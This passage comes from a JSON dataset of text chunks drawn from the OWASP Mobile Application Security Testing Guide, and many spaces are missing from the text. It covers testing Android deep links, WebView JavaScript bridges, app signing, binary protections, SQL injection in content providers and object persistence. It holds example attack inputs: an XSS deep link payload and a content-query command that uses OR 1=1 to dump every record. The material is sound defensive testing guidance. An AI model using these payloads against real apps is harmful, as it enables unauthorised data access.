thefiledoesn’tincludethetargetapp’spackage. CheckforRedirects: Toenhancetheappsecurity,thesystemdoesn’tverifyanyAndroidAppLinksforanappiftheserversetsaredirectsuch ashttp://example.comtohttps://example.comorexample.comtowww.example.com. CheckforSubdomains: If an intent filter lists multiple hosts with different subdomains, there must be a valid Digital Asset Links file on each domain. Forexample,thefollowingintentfilterincludeswww.example.comandmobile.example.comasacceptedintent URLhosts. 282\\n<application> <activity android:name=”MainActivity”> <intent-filter android:autoVerify=\"true\"> <action android:name=\"android.intent.action.VIEW\" /> <category android:name=\"android.intent.category.DEFAULT\" /> <category android:name=\"android.intent.category.BROWSABLE\" /> <data android:scheme=\"https\" /> <data android:scheme=\"https\" /> <data android:host=\"www.example.com\" /> <data android:host=\"mobile.example.com\" /> </intent-filter> </activity> </application> Inorderforthedeeplinkstocorrectlyregister,avalidDigitalAssetLinksfilemustbepublishedatbothhttps://www. example.com/.well-known/assetlinks.jsonandhttps://mobile.example.com/.well-known/assetlinks.json. CheckforWildcards: Ifthehostnameincludesawildcard(suchas*.example.com),youshouldbeabletofindavalidDigitalAssetLinksfileat theroothostname: https://example.com/.well-known/assetlinks.json. Check the Handler Method Even if the deep link is correctly verified, the logic of the handler method should be carefully analyzed. Pay special attentiontodeeplinksbeingusedtotransmitdata(whichiscontrolledexternallybytheuseroranyotherapp). First,obtainthenameoftheActivityfromtheAndroidManifest<activity>elementwhichdefinesthetarget<intent- filter>andsearchforusageofgetIntentandgetData. Thisgeneralapproachoflocatingthesemethodscanbeused acrossmostapplicationswhenperformingreverseengineeringandiskeywhentryingtounderstandhowtheapplication usesdeeplinksandhandlesanyexternallyprovidedinputdataandifitcouldbesubjecttoanykindofabuse. ThefollowingexampleisasnippetfromanexemplaryKotlinappdecompiledwithjadx. Fromthestaticanalysisweknow thatitsupportsthedeeplinkdeeplinkdemo://load.html/aspartofcom.mstg.deeplinkdemo.WebViewActivity. //snippeteditedforsimplicity public final class WebViewActivity extends AppCompatActivity { private ActivityWebViewBindingbinding; public void onCreate(BundlesavedInstanceState){ Uridata =getIntent().getData(); Stringhtml =data ==null ?null :data.getQueryParameter(\"html\"); Uridata2 =getIntent().getData(); Stringdeeplink_url =data2 ==null ?null :data2.getQueryParameter(\"url\"); ViewfindViewById =findViewById(R.id.webView); if(findViewById !=null){ WebViewwv =(WebView)findViewById; wv.getSettings().setJavaScriptEnabled(true); if(deeplink_url !=null){ wv.loadUrl(deeplink_url); ... You can simply follow the deeplink_url String variable and see the result from the wv.loadUrl call. This means the attackerhasfullcontroloftheURLbeingloadedtotheWebView(asshownabovehasJavaScriptenabled. ThesameWebViewmightbealsorenderinganattackercontrolledparameter. Inthatcase,thefollowingdeeplinkpayload wouldtriggerReflectedCross-SiteScripting(XSS)withinthecontextoftheWebView: deeplinkdemo://load.html?attacker_controlled=<svgonload=alert(1)> Buttherearemanyotherpossibilities. Besuretocheckthefollowingsectionstolearnmoreaboutwhattoexpectand howtotestdifferentscenarios: • “Cross-SiteScriptingFlaws”. • “InjectionFlaws”. • “TestingObjectPersistence”. • “TestingforURLLoadinginWebViews” • “TestingJavaScriptExecutioninWebViews” • “TestingWebViewProtocolHandlers” 283\\nInaddition,werecommendtosearchandreadpublicreports(searchterm: \"deep link*\"|\"deeplink*\" site:https:// hackerone.com/reports/). Forexample: • “[HackerOne#1372667]Abletostealbearertokenfromdeeplink” • “[HackerOne#401793]Insecuredeeplinkleadstosensitiveinformationdisclosure” • “[HackerOne#583987]AndroidappdeeplinkleadstoCSRFinfollowaction” • “[HackerOne#637194]BypassofbiometricssecurityfunctionalityispossibleinAndroidapplication” • “[HackerOne#341908]XSSviaDirectMessagedeeplinks” Dynamic Analysis Here you will use the list of deep links from the static analysis to iterate and determine each handler method and the processeddata,ifany. YouwillfirststartaFridahookandthenbegininvokingthedeeplinks. Thefollowingexampleassumesatargetappthatacceptsthisdeeplink: deeplinkdemo://load.html. However,wedon’t knowthecorrespondinghandlermethodyet,northeparametersitpotentiallyaccepts. [Step1]FridaHooking: Youcanusethescript“AndroidDeepLinkObserver”fromFridaCodeSharetomonitorallinvokeddeeplinkstriggeringa calltoIntent.getData. Youcanalsousethescriptasabasetoincludeyourownmodificationsdependingontheuse case at hand. In this case we included the stack trace in the script since we are interested in the method which calls Intent.getData. [Step2]InvokingDeepLinks: Now you can invoke any of the deep links using adb and the Activity Manager (am) which will",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 106
    }
  },
  {
    "text": "deeplinkdemo://load.html. However,wedon’t knowthecorrespondinghandlermethodyet,northeparametersitpotentiallyaccepts. [Step1]FridaHooking: Youcanusethescript“AndroidDeepLinkObserver”fromFridaCodeSharetomonitorallinvokeddeeplinkstriggeringa calltoIntent.getData. Youcanalsousethescriptasabasetoincludeyourownmodificationsdependingontheuse case at hand. In this case we included the stack trace in the script since we are interested in the method which calls Intent.getData. [Step2]InvokingDeepLinks: Now you can invoke any of the deep links using adb and the Activity Manager (am) which will send intents within the Androiddevice. Forexample: adbshellamstart -W-aandroid.intent.action.VIEW -d\"deeplinkdemo://load.html/?message=ok#part1\" Starting:Intent{act=android.intent.action.VIEWdat=deeplinkdemo://load.html/?message=ok} Status:ok LaunchState:WARM Activity:com.mstg.deeplinkdemo/.WebViewActivity TotalTime:210 WaitTime:217 Complete Thismighttriggerthedisambiguationdialogwhenusingthe“http/https”schemaorifotherinstalledappssupport thesamecustomURLschema. Youcanincludethepackagenametomakeitanexplicitintent. Thisinvocationwilllogthefollowing: [*]Intent.getData()wascalled [*]Activity:com.mstg.deeplinkdemo.WebViewActivity [*]Action:android.intent.action.VIEW [*]Data -Scheme:deeplinkdemo:// -Host:/load.html -Params:message=ok -Fragment:part1 [*]Stacktrace: android.content.Intent.getData(Intent.java) com.mstg.deeplinkdemo.WebViewActivity.onCreate(WebViewActivity.kt) android.app.Activity.performCreate(Activity.java) ... com.android.internal.os.ZygoteInit.main(ZygoteInit.java) In this case we’ve crafted the deep link including arbitrary parameters (?message=ok) and fragment (#part1). We still don’t know if they are being used. The information above reveals useful information that you can use now to reverse engineertheapp. Seethesection“ChecktheHandlerMethod”tolearnaboutthingsyoushouldconsider. • File: WebViewActivity.kt • Class: com.mstg.deeplinkdemo.WebViewActivity • Method: onCreate 284\\nSometimes you can even take advantage of other applications that you know interact with your target app. You can reverse engineer the app, (e.g. to extract all strings and filter those which include the target deep links, deeplinkdemo:///load.htmlinthepreviouscase), orusethemastriggers, whilehookingtheappaspreviously discussed. Testing for Java Objects Exposed Through WebViews Platform: android MASVSV1: MSTG-PLATFORM-7 MASVSV2: MASVS-PLATFORM-2 Overview TotestforJavaobjectsexposedthroughWebViewschecktheappforWebViewshavingJavaScriptenabledanddetermine whethertheWebViewiscreatinganyJavaScriptinterfacesaka. “JavaScriptBridges”. Finally,checkwhetheranattacker couldpotentiallyinjectmaliciousJavaScriptcode. Static Analysis The following example shows how addJavascriptInterface is used to bridge a Java Object and JavaScript in a Web- View: WebViewwebview =newWebView(this); WebSettingswebSettings =webview.getSettings(); webSettings.setJavaScriptEnabled(true); MSTG_ENV_008_JS_InterfacejsInterface =newMSTG_ENV_008_JS_Interface(this); myWebView.addJavascriptInterface(jsInterface,\"Android\"); myWebView.loadURL(\"http://example.com/file.html\"); setContentView(myWebView); In Android 4.2 (API level 17) and above, an annotation @JavascriptInterface explicitly allows JavaScript to access a Javamethod. public class MSTG_ENV_008_JS_Interface { ContextmContext; /**Instantiatetheinterfaceandsetthecontext */ MSTG_ENV_005_JS_Interface(Contextc){ mContext =c; } @JavascriptInterface public String returnString (){ return \"SecretString\"; } /**Showatoastfromthewebpage */ @JavascriptInterface public void showToast(Stringtoast){ Toast.makeText(mContext,toast,Toast.LENGTH_SHORT).show(); } } ThisishowyoucancallthemethodreturnStringfromJavaScript,thestring“SecretString”willbestoredinthevariable result: varresult =window.Android.returnString(); WithaccesstotheJavaScriptcode,via,forexample,storedXSSoraMITMattack,anattackercandirectlycalltheexposed Javamethods. IfaddJavascriptInterfaceisnecessary,takethefollowingconsiderations: 285\\n• Only JavaScript provided with the APK should be allowed to use the bridges, e.g. by verifying the URL on each bridgedJavamethod(viaWebView.getUrl). • NoJavaScriptshouldbeloadedfromremoteendpoints,e.g.bykeepingpagenavigationwithintheapp’sdomains andopeningallotherdomainsonthedefaultbrowser(e.g.Chrome,Firefox). • Ifnecessaryforlegacyreasons(e.g.havingtosupportolderdevices),atleastsettheminimalAPIlevelto17inthe manifestfileoftheapp(<uses-sdk android:minSdkVersion=\"17\" />). Dynamic Analysis DynamicanalysisoftheappcanshowyouwhichHTMLorJavaScriptfilesareloadedandwhichvulnerabilitiesarepresent. TheprocedureforexploitingthevulnerabilitystartswithproducingaJavaScriptpayloadandinjectingitintothefilethat theappisrequesting. TheinjectioncanbeaccomplishedviaaMITMattackordirectmodificationofthefileifitisstoredin externalstorage. ThewholeprocesscanbeaccomplishedviaDrozerandweasel(MWR’sadvancedexploitationpayload), whichcaninstallafullagent,injectingalimitedagentintoarunningprocessorconnectingareverseshellasaRemote AccessTool(RAT). Afulldescriptionoftheattackisincludedintheblogarticle“WebViewaddJavascriptInterfaceRemoteCodeExecution”. 286\\nAndroid Code Quality and Build Settings Overview App Signing AndroidrequiresallAPKstobedigitallysignedwithacertificatebeforetheyareinstalledorrun. Thedigitalsignatureis usedtoverifytheowner’sidentityforapplicationupdates. Thisprocesscanpreventanappfrombeingtamperedwithor modifiedtoincludemaliciouscode. When an APK is signed, a public-key certificate is attached to it. This certificate uniquely associates the APK with the developerandthedeveloper’sprivatekey. Whenanappisbeingbuiltindebugmode,theAndroidSDKsignstheappwith adebugkeycreatedspecificallyfordebuggingpurposes. Anappsignedwithadebugkeyisnotmeanttobedistributed andwon’tbeacceptedinmostappstores,includingtheGooglePlayStore. Thefinalreleasebuildofanappmustbesignedwithavalidreleasekey. InAndroidStudio,theappcanbesignedmanually orviacreationofasigningconfigurationthat’sassignedtothereleasebuildtype. PriorAndroid9(APIlevel28)allappupdatesonAndroidneedtobesignedwiththesamecertificate,soavalidityperiod of25yearsormoreisrecommended. AppspublishedonGooglePlaymustbesignedwithakeythatthathasavalidity periodendingafterOctober22th,2033. ThreeAPKsigningschemesareavailable: • JARsigning(v1scheme), • APKSignatureSchemev2(v2scheme), • APKSignatureSchemev3(v3scheme). Thev2signature,whichissupportedbyAndroid7.0(APIlevel24)andabove,offersimprovedsecurityandperformance compared to v1 scheme. The V3 signature, which is supported by Android 9 (API level 28) and above, gives apps the abilitytochangetheirsigningkeysaspartofanAPKupdate. Thisfunctionalityassurescompatibilityandappscontinuous availabilitybyallowingboththenewandtheoldkeystobeused. Notethatitisonlyavailableviaapksigneratthetime ofwriting. Foreachsigningschemethereleasebuildsshouldalwaysbesignedviaallitspreviousschemesaswell. Third-Party Libraries Androidappsoftenmakeuseofthirdpartylibraries. Thesethirdpartylibrariesacceleratedevelopmentasthedeveloper hastowritelesscodeinordertosolveaproblem. Therearetwocategoriesoflibraries: • Librariesthatarenot(orshouldnot)bepackedwithintheactualproductionapplication,suchasMockitousedfor testingandlibrarieslikeJavaAssistusedtocompilecertainotherlibraries. • Librariesthatarepackedwithintheactualproductionapplication,suchasOkhttp3. Theselibrariescanleadtounwantedside-effects: • Alibrarycancontainavulnerability,whichwillmaketheapplicationvulnerable. Agoodexamplearetheversions ofOKHTTPpriorto2.7.5inwhichTLSchainpollutionwaspossibletobypassSSLpinning. • Alibrarycannolongerbemaintainedorhardlybeused,whichiswhynovulnerabilitiesarereportedand/orfixed. Thiscanleadtohavingbadand/orvulnerablecodeinyourapplicationthroughthelibrary. • Alibrarycanusealicense,suchasLGPL2.1,whichrequirestheapplicationauthortoprovideaccesstothesource code for those who use the application and request insight in its sources. In fact the application should then be allowedtoberedistributedwithmodificationstoitssourcecode. Thiscanendangertheintellectualproperty(IP)of theapplication. Pleasenotethatthisissuecanholdonmultiplelevels: WhenyouusewebviewswithJavaScriptrunninginthewebview, theJavaScriptlibrariescanhavetheseissuesaswell. Thesameholdsforplugins/librariesforCordova,React-nativeand Xamarinapps. 287\\nMemory Corruption Bugs AndroidapplicationsrunonaVMwheremostofthememorycorruptionissueshavebeentakencareoff. Thisdoesnot meanthattherearenomemorycorruptionbugs. TakeCVE-2018-9522forinstance,whichisrelatedtoserializationissues usingParcels. Next,innativecode,westillseethesameissuesasweexplainedinthegeneralmemorycorruptionsection. Last,weseememorybugsinsupportingservices,suchaswiththeStagefrightattackasshownatBlackHat. Memoryleaksareoftenanissueaswell. ThiscanhappenforinstancewhenareferencetotheContextobjectispassed aroundtonon-Activityclasses,orwhenyoupassreferencestoActivityclassestoyourhelperclasses. Binary Protection Mechanisms Detectingthepresenceofbinaryprotectionmechanismsheavilydependonthelanguageusedfordevelopingtheappli- cation. Ingeneralallbinariesshouldbetested,whichincludesboththemainappexecutableaswellasalllibraries/dependencies. However,onAndroidwewillfocusonnativelibrariessincethemainexecutablesareconsideredsafeaswewillseenext. AndroidoptimizesitsDalvikbytecodefromtheappDEXfiles(e.g.classes.dex)andgeneratesanewfilecontainingthe nativecode,usuallywithan.odex,.oatextension. ThisAndroidcompiledbinaryiswrappedusingtheELFformatwhich istheformatusedbyLinuxandAndroidtopackageassemblycode. Theapp’sNDKnativelibrariesalsousetheELFformat. • PIE(PositionIndependentExecutable): – SinceAndroid7.0(APIlevel24),PICcompilationisenabledbydefaultforthemainexecutables. – WithAndroid5.0(APIlevel21),supportfornon-PIEenablednativelibrarieswasdroppedandsincethen,PIE isenforcedbythelinker. • Memorymanagement: – Garbage Collection will simply run for the main binaries and there’s nothing to be checked on the binaries",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 107
    }
  },
  {
    "text": "AndroidapplicationsrunonaVMwheremostofthememorycorruptionissueshavebeentakencareoff. Thisdoesnot meanthattherearenomemorycorruptionbugs. TakeCVE-2018-9522forinstance,whichisrelatedtoserializationissues usingParcels. Next,innativecode,westillseethesameissuesasweexplainedinthegeneralmemorycorruptionsection. Last,weseememorybugsinsupportingservices,suchaswiththeStagefrightattackasshownatBlackHat. Memoryleaksareoftenanissueaswell. ThiscanhappenforinstancewhenareferencetotheContextobjectispassed aroundtonon-Activityclasses,orwhenyoupassreferencestoActivityclassestoyourhelperclasses. Binary Protection Mechanisms Detectingthepresenceofbinaryprotectionmechanismsheavilydependonthelanguageusedfordevelopingtheappli- cation. Ingeneralallbinariesshouldbetested,whichincludesboththemainappexecutableaswellasalllibraries/dependencies. However,onAndroidwewillfocusonnativelibrariessincethemainexecutablesareconsideredsafeaswewillseenext. AndroidoptimizesitsDalvikbytecodefromtheappDEXfiles(e.g.classes.dex)andgeneratesanewfilecontainingthe nativecode,usuallywithan.odex,.oatextension. ThisAndroidcompiledbinaryiswrappedusingtheELFformatwhich istheformatusedbyLinuxandAndroidtopackageassemblycode. Theapp’sNDKnativelibrariesalsousetheELFformat. • PIE(PositionIndependentExecutable): – SinceAndroid7.0(APIlevel24),PICcompilationisenabledbydefaultforthemainexecutables. – WithAndroid5.0(APIlevel21),supportfornon-PIEenablednativelibrarieswasdroppedandsincethen,PIE isenforcedbythelinker. • Memorymanagement: – Garbage Collection will simply run for the main binaries and there’s nothing to be checked on the binaries themselves. – GarbageCollectiondoesnotapplytoAndroidnativelibraries. Thedeveloperisresponsiblefordoingproper manualmemorymanagement. See“MemoryCorruptionBugs”. • StackSmashingProtection: – AndroidappsgetcompiledtoDalvikbytecodewhichisconsideredmemorysafe(atleastformitigatingbuffer overflows). OtherframeworkssuchasFlutterwillnotcompileusingstackcanariesbecauseofthewaytheir language,inthiscaseDart,mitigatesbufferoverflows. – ItmustbeenabledforAndroidnativelibrariesbutitmightbedifficulttofullydetermineit. ∗ NDKlibrariesshouldhaveitenabledsincethecompilerdoesitbydefault. ∗ OthercustomC/C++librariesmightnothaveitenabled. Learnmore: • Androidexecutableformats • Androidruntime(ART) • AndroidNDK • AndroidlinkerchangesforNDKdevelopers Debuggable Apps Debugging is an essential process for developers to identify and fix errors or bugs in their Android app. By using a debugger, developers can select the device to debug their app on and set breakpoints in their Java, Kotlin, and C/C++ code. Thisallowsthemtoanalyzevariablesandevaluateexpressionsatruntime,whichhelpsthemtoidentifytheroot causeofmanyissues. Bydebuggingtheirapp,developerscanimprovethefunctionalityanduserexperienceoftheirapp, ensuringthatitrunssmoothlywithoutanyerrorsorcrashes. Everydebugger-enabledprocessrunsanextrathreadforhandlingJDWPprotocolpackets. Thisthreadisstartedonlyfor appsthathavetheandroid:debuggable=\"true\"attributeintheApplicationelementwithintheAndroidManifest. 288\\nDebugging Symbols Generally,youshouldprovidecompiledcodewithaslittleexplanationaspossible. Somemetadata,suchasdebugging information,linenumbers,anddescriptivefunctionormethodnames,makethebinaryorbytecodeeasierforthereverse engineertounderstand,butthesearen’tneededinareleasebuildandcanthereforebesafelyomittedwithoutimpacting theapp’sfunctionality. To inspect native binaries, use a standard tool like nm or objdump to examine the symbol table. A release build should generally not contain any debugging symbols. If the goal is to obfuscate the library, removing unnecessary dynamic symbolsisalsorecommended. Debugging Code and Error Logging StrictMode StrictModeisadevelopertoolfordetectingviolations, e.g.accidentaldiskornetworkaccessontheapplication’smain thread. Itcanalsobeusedtocheckforgoodcodingpractices,suchasimplementingperformantcode. HereisanexampleofStrictModewithpoliciesenabledfordiskandnetworkaccesstothemainthread: public void onCreate(){ if(DEVELOPER_MODE){ StrictMode.setThreadPolicy(newStrictMode.ThreadPolicy.Builder() .detectDiskReads() .detectDiskWrites() .detectNetwork() //or.detectAll()foralldetectableproblems .penaltyLog() .build()); StrictMode.setVmPolicy(newStrictMode.VmPolicy.Builder() .detectLeakedSqlLiteObjects() .detectLeakedClosableObjects() .penaltyLog() .penaltyDeath() .build()); } super.onCreate(); } Inserting the policy in the if statement with the DEVELOPER_MODE condition is recommended. To disable StrictMode, DEVELOPER_MODEmustbedisabledforthereleasebuild. Exception Handling Exceptions occur when an application gets into an abnormal or error state. Both Java and C++ may throw exceptions. Testingexceptionhandlingisaboutensuringthattheappwillhandleanexceptionandtransitiontoasafestatewithout exposingsensitiveinformationviatheUIortheapp’sloggingmechanisms. Make Sure That Free Security Features Are Activated Platform: android MASVSV1: MSTG-CODE-9 MASVSV2: MASVS-CODE-4 Overview Static Analysis TesttheappnativelibrariestodetermineiftheyhavethePIEandstacksmashingprotectionsenabled. Youcanuseradare2’srabin2togetthebinaryinformation. We’llusetheUnCrackableAppforAndroidLevel4v1.0APK asanexample. 289\\nAllnativelibrariesmusthavecanaryandpicbothsettotrue. That’sthecaseforlibnative-lib.so: rabin2 -Ilib/x86_64/libnative-lib.so |grep -E\"canary|pic\" canary true pic true Butnotforlibtool-checker.so: rabin2 -Ilib/x86_64/libtool-checker.so |grep -E\"canary|pic\" canary false pic true Inthisexample,libtool-checker.somustberecompiledwithstacksmashingprotectionsupport. Testing for Injection Flaws Platform: android MASVSV1: MSTG-PLATFORM-2 MASVSV2: MASVS-CODE-4 Overview Totestforinjectionflawsyouneedtofirstrelyonothertestsandcheckforfunctionalitythatmighthavebeenexposed: • “TestingDeepLinks” • “TestingforSensitiveFunctionalityExposureThroughIPC” • “TestingforOverlayAttacks” Static Analysis AnexampleofavulnerableIPCmechanismisshownbelow. YoucanuseContentProviderstoaccessdatabaseinformation,andyoucanprobeservicestoseeiftheyreturndata. If dataisnotvalidatedproperly,thecontentprovidermaybepronetoSQLinjectionwhileotherappsareinteractingwith it. SeethefollowingvulnerableimplementationofaContentProvider. <provider android:name=\".OMTG_CODING_003_SQL_Injection_Content_Provider_Implementation\" android:authorities=\"sg.vp.owasp_mobile.provider.College\"> </provider> The AndroidManifest.xml above defines a content provider that’s exported and therefore available to all other apps. ThequeryfunctionintheOMTG_CODING_003_SQL_Injection_Content_Provider_Implementation.javaclassshouldbe inspected. @Override public Cursor query(Uriuri,String[]projection,Stringselection,String[]selectionArgs,StringsortOrder){ SQLiteQueryBuilderqb =newSQLiteQueryBuilder(); qb.setTables(STUDENTS_TABLE_NAME); switch (uriMatcher.match(uri)){ case STUDENTS: qb.setProjectionMap(STUDENTS_PROJECTION_MAP); break; case STUDENT_ID: //SQLInjectionwhenprovidinganID qb.appendWhere(_ID+\"=\"+uri.getPathSegments().get(1)); Log.e(\"appendWhere\",uri.getPathSegments().get(1).toString()); break; 290\\ndefault: throw newIllegalArgumentException(\"UnknownURI\" +uri); } if(sortOrder ==null ||sortOrder ==\"\"){ /** *Bydefaultsortonstudentnames */ sortOrder =NAME; } Cursorc =qb.query(db,projection,selection,selectionArgs,null,null, sortOrder); /** *registertowatchacontentURIforchanges */ c.setNotificationUri(getContext().getContentResolver(),uri); return c; } WhiletheuserisprovidingaSTUDENT_IDatcontent://sg.vp.owasp_mobile.provider.College/students,thequery statement is prone to SQL injection. Obviously prepared statements must be used to avoid SQL injection, but input validationshouldalsobeappliedsothatonlyinputthattheappisexpectingisprocessed. AllappfunctionsthatprocessdatacominginthroughtheUIshouldimplementinputvalidation: • Foruserinterfaceinput,AndroidSaripaarv2canbeused. • ForinputfromIPCorURLschemes,avalidationfunctionshouldbecreated. Forexample,thefollowingdetermines whetherthestringisalphanumeric: public boolean isAlphaNumeric(Strings){ Stringpattern=\"^[a-zA-Z0-9]*$\"; return s.matches(pattern); } An alternative to validation functions is type conversion, with, for example, Integer.parseInt if only integers are ex- pected. TheOWASPInputValidationCheatSheetcontainsmoreinformationaboutthistopic. Dynamic Analysis ThetestershouldmanuallytesttheinputfieldswithstringslikeOR1=1--if,forexample,alocalSQLinjectionvulnerability hasbeenidentified. Onarooteddevice,thecommandcontentcanbeusedtoquerythedatafromacontentprovider. Thefollowingcommand queriesthevulnerablefunctiondescribedabove. ##contentquery--uricontent://sg.vp.owasp_mobile.provider.College/students SQL injection can be exploited with the following command. Instead of getting the record for Bob only, the user can retrievealldata. ##contentquery--uricontent://sg.vp.owasp_mobile.provider.College/students--where\"name='Bob')OR1=1--''\" Testing Local Storage for Input Validation Platform: android MASVSV1: MSTG-PLATFORM-2 MASVSV2: MASVS-CODE-4 291\\nOverview Foranypubliclyaccessibledatastorage,anyprocesscanoverridethedata. Thismeansthatinputvalidationneedstobe appliedthemomentthedataisreadbackagain. Note: Thesameistrueforprivateaccessibledataonarooteddevice Static analysis Using Shared Preferences WhenyouusetheSharedPreferences.Editortoreadorwriteint/boolean/longvalues, youcannotcheckwhetherthe data is overridden or not. However: it can hardly be used for actual",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 108
    }
  },
  {
    "text": "of getting the record for Bob only, the user can retrievealldata. ##contentquery--uricontent://sg.vp.owasp_mobile.provider.College/students--where\"name='Bob')OR1=1--''\" Testing Local Storage for Input Validation Platform: android MASVSV1: MSTG-PLATFORM-2 MASVSV2: MASVS-CODE-4 291\\nOverview Foranypubliclyaccessibledatastorage,anyprocesscanoverridethedata. Thismeansthatinputvalidationneedstobe appliedthemomentthedataisreadbackagain. Note: Thesameistrueforprivateaccessibledataonarooteddevice Static analysis Using Shared Preferences WhenyouusetheSharedPreferences.Editortoreadorwriteint/boolean/longvalues, youcannotcheckwhetherthe data is overridden or not. However: it can hardly be used for actual attacks other than chaining the values (e.g. no additional exploits can be packed which will take over the control flow). In the case of a String or a StringSet you should be careful with how the data is interpreted. Using reflection based persistence? Check the section on “Testing Object Persistence” for Android to see how it should be validated. Using the SharedPreferences.Editor to store and readcertificatesorkeys? MakesureyouhavepatchedyoursecurityprovidergivenvulnerabilitiessuchasfoundinBouncy Castle. Inallcases,havingthecontentHMACedcanhelptoensurethatnoadditionsand/orchangeshavebeenapplied. Using Other Storage Mechanisms Incaseotherpublicstoragemechanisms(thantheSharedPreferences.Editor)areused,thedataneedstobevalidated themomentitisreadfromthestoragemechanism. Memory Corruption Bugs Platform: android MASVSV1: MSTG-CODE-8 MASVSV2: MASVS-CODE-4 Overview Static Analysis Therearevariousitemstolookfor: • Are there native code parts? If so: check for the given issues in the general memory corruption section. Native codecaneasilybespottedgivenJNI-wrappers,.CPP/.H/.Cfiles,NDKorothernativeframeworks. • IsthereJavacodeorKotlincode? LookforSerialization/deserializationissues,suchasdescribedinAbriefhistory ofAndroiddeserializationvulnerabilities. NotethattherecanbeMemoryleaksinJava/Kotlincodeaswell. Lookforvariousitems,suchas: BroadcastReceiverswhich arenotunregistered,staticreferencestoActivityorViewclasses,SingletonclassesthathavereferencestoContext, InnerClassreferences,AnonymousClassreferences,AsyncTaskreferences,Handlerreferences,Threadingdonewrong, TimerTaskreferences. Formoredetails,pleasecheck: • 9waystoavoidmemoryleaksinAndroid • MemoryLeakPatternsinAndroid. 292\\nDynamic Analysis Therearevariousstepstotake: • Incaseofnativecode: useValgrindorMempatroltoanalyzethememoryusageandmemorycallsmadebythe code. • IncaseofJava/Kotlincode,trytorecompiletheappanduseitwithSquaresleakcanary. • CheckwiththeMemoryProfilerfromAndroidStudioforleakage. • CheckwiththeAndroidJavaDeserializationVulnerabilityTester,forserializationvulnerabilities. Testing Object Persistence Platform: android MASVSV1: MSTG-PLATFORM-8 MASVSV2: MASVS-CODE-4 Overview Totestforobjectpersistencebeingusedforstoringsensitiveinformationonthedevice,firstidentifyallinstancesofobject serialization and check if they carry any sensitive data. If yes, check if is properly protected against eavesdropping or unauthorizedmodification. Thereareafewgenericremediationstepsthatyoucanalwaystake: 1. MakesurethatsensitivedatahasbeenencryptedandHMACed/signedafterserialization/persistence. Evaluatethe signatureorHMACbeforeyouusethedata. Seethechapter“AndroidCryptographicAPIs”formoredetails. 2. Makesurethatthekeysusedinstep1can’tbeextractedeasily. Theuserand/orapplicationinstanceshouldbe properlyauthenticated/authorizedtoobtainthekeys. Seethechapter“DataStorageonAndroid”formoredetails. 3. Make sure that the data within the de-serialized object is carefully validated before it is actively used (e.g., no exploitofbusiness/applicationlogic). Forhigh-riskapplicationsthatfocusonavailability,werecommendthatyouuseSerializableonlywhentheserialized classesarestable. Second,werecommendnotusingreflection-basedpersistencebecause • theattackercouldfindthemethod’ssignatureviatheString-basedargument • theattackermightbeabletomanipulatethereflection-basedstepstoexecutebusinesslogic. Seethechapter“AndroidAnti-ReversingDefenses”formoredetails. Static Analysis Object Serialization Searchthesourcecodeforthefollowingkeywords: • import java.io.Serializable • implements Serializable JSON If you need to counter memory-dumping, make sure that very sensitive information is not stored in the JSON format becauseyoucan’tguaranteepreventionofanti-memorydumpingtechniqueswiththestandardlibraries. Youcancheck forthefollowingkeywordsinthecorrespondinglibraries: JSONObjectSearchthesourcecodeforthefollowingkeywords: • import org.json.JSONObject; • import org.json.JSONArray; 293\\nGSONSearchthesourcecodeforthefollowingkeywords: • import com.google.gson • import com.google.gson.annotations • import com.google.gson.reflect • import com.google.gson.stream • new Gson(); • Annotationssuchas@Expose,@JsonAdapter,@SerializedName,@Since,and@Until JacksonSearchthesourcecodeforthefollowingkeywords: • import com.fasterxml.jackson.core • import org.codehaus.jacksonfortheolderversion. ORM WhenyouuseanORMlibrary,makesurethatthedataisstoredinanencrypteddatabaseandtheclassrepresentations areindividuallyencryptedbeforestoringit. Seethechapters“DataStorageonAndroid”and“AndroidCryptographicAPIs” formoredetails. Youcancheckforthefollowingkeywordsinthecorrespondinglibraries: OrmLiteSearchthesourcecodeforthefollowingkeywords: • import com.j256.* • import com.j256.dao • import com.j256.db • import com.j256.stmt • import com.j256.table\\ Pleasemakesurethatloggingisdisabled. SugarORMSearchthesourcecodeforthefollowingkeywords: • import com.github.satyan • extends SugarRecord<Type> • In the AndroidManifest, there will be meta-data entries with values such as DATABASE, VERSION, QUERY_LOG and DOMAIN_PACKAGE_NAME. MakesurethatQUERY_LOGissettofalse. GreenDAOSearchthesourcecodeforthefollowingkeywords: • import org.greenrobot.greendao.annotation.Convert • import org.greenrobot.greendao.annotation.Entity • import org.greenrobot.greendao.annotation.Generated • import org.greenrobot.greendao.annotation.Id • import org.greenrobot.greendao.annotation.Index • import org.greenrobot.greendao.annotation.NotNull • import org.greenrobot.greendao.annotation.* • import org.greenrobot.greendao.database.Database • import org.greenrobot.greendao.query.Query ActiveAndroidSearchthesourcecodeforthefollowingkeywords: • ActiveAndroid.initialize(<contextReference>); • import com.activeandroid.Configuration • import com.activeandroid.query.* RealmSearchthesourcecodeforthefollowingkeywords: • import io.realm.RealmObject; • import io.realm.annotations.PrimaryKey; 294\\nParcelable Make sure that appropriate security measures are taken when sensitive information is stored in an Intent via a Bundle thatcontainsaParcelable. UseexplicitIntentsandverifyproperadditionalsecuritycontrolswhenusingapplication-level IPC(e.g.,signatureverification,intent-permissions,crypto). Dynamic Analysis Thereareseveralwaystoperformdynamicanalysis: 1. Fortheactualpersistence: Usethetechniquesdescribedinthedatastoragechapter. 2. For reflection-based approaches: Use Xposed to hook into the deserialization methods or add unprocessable in- formation to the serialized objects to see how they are handled (e.g., whether the application crashes or extra informationcanbeextractedbyenrichingtheobjects). Testing Implicit Intents Platform: android MASVSV1: MSTG-PLATFORM-2 MASVSV2: MASVS-CODE-4 Overview Whentestingforimplicitintentsyouneedtocheckiftheyarevulnerabletoinjectionattacksorpotentiallyleakingsensitive data. Static Analysis InspecttheAndroidManifestandlookforany<intent>signaturesdefinedinsideblocks(whichspecifythesetofother appsanappintendstointeractwith), checkifitcontainsanysystemactions(e.g.android.intent.action.GET_CON- TENT, android.intent.action.PICK,",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 109
    }
  },
  {
